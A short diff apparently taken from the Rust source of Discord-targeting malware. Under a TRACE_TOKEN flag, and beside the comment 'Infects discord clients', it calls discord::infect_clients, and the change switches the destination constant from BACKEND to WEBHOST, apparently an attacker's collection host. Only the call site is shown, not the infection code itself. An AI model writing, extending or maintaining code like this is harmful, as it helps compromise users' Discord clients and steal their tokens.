@@ -111,7 +111,7 @@ fn main() {
 
     if constants::TRACE_TOKEN {
         // Infects discord clients
-        discord::infect_clients(constants::BACKEND);
+        discord::infect_clients(constants::WEBHOST);
     }
 
     let temp_env = std::env::temp_dir();
